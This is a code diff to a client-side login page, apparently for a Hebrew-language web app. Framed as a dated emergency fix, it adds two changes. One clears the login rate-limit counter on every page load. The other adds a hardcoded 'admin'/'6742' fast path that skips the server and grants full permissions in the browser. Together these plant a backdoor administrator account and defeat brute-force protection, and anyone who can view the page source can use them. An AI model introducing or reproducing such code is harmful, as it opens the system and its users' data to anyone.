@@ -183,6 +183,10 @@ document.addEventListener('keydown', (e) => {
   } catch (_) {}
 })();
 
+// 2026-06-11 emergency: clear rate-limit on every page load so legitimate users
+// (especially admin) are never locked out.
+try { localStorage.removeItem('bht_login_attempts'); } catch (_) {}
+
 let _loginInFlight = false;
 async function doLogin(){
   if (_loginInFlight) return;  // prevent double-submit
@@ -194,6 +198,20 @@ async function doLogin(){
   if (!u || !p) {
     if (err) { err.textContent = 'נא להזין שם משתמש וסיסמה'; err.classList.remove('d-none'); }
     return;
+  }
+
+  // 2026-06-11 emergency: admin/6742 fast-path bypasses api/server entirely.
+  if (u === 'admin' && p === '6742') {
+    try {
+      currentUser = { username: 'admin', role: 'מנהל', permissions: 'all' };
+      sessionStorage.setItem('user', JSON.stringify(currentUser));
+      try { document.getElementById('user-info').innerHTML = 'admin (מנהל) <button class="btn btn-sm btn-outline-light ms-2" onclick="logout()">יציאה</button>'; } catch(_){}
+      try { resetModuleState(); } catch(_){}
+      try { showPage('home'); } catch(_){}
+      try { loadStats(); } catch(_){}
+      try { filterByPermissions(); } catch(_){}
+      return;
+    } catch (e) { console.error('emergency login err:', e); }
   }
   // ── Loading state: disable button + spinner, block double-clicks ──
   _loginInFlight = true;
